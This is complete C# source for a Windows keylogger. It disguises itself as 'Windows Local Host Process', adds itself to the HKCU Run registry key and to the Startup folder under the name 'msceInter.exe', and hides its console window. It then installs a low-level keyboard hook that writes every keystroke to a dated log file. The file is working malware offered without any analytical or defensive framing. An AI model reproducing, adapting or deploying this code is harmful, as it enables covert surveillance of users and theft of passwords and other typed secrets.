using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;

namespace Windows_Local_Host_Process
{
    class Program
    {
         

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        static string Date = DateTime.Today.ToString().Substring(0, 10).Replace("/", "");

        public static void Main(string[] args)
        {
            
            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("AutoRun", Application.ExecutablePath.ToString());
                
            AddToStartup();
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Local Host Process", Application.StartupPath);
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);
            //MessageBox.Show(Application.StartupPath + @"\" + Date + ".txt");

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        public static void AddToStartup()
        {
            //MessageBox.Show(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
            try
            {
                System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
            }
                
            catch { }
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //MessageBox.Show(Convert.ToString((Keys)vkCode));
                Console.WriteLine((Keys)vkCode);                
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\" + Date + ".txt", true);
                if (Convert.ToString((Keys)vkCode) == "Return")
                {
                    sw.WriteLine(" ");
                }
                else if (Convert.ToString((Keys)vkCode) == "Back")
                {
                    sw.Write("↚");
                }
                else if (Convert.ToString((Keys)vkCode) == "Space")
                {
                    sw.Write(" ");
                }
                else if (Convert.ToString((Keys)vkCode) == "Delete")
                {
                    sw.Write("↛");
                }
                else
                {
                    sw.Write((Keys)vkCode);
                }
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
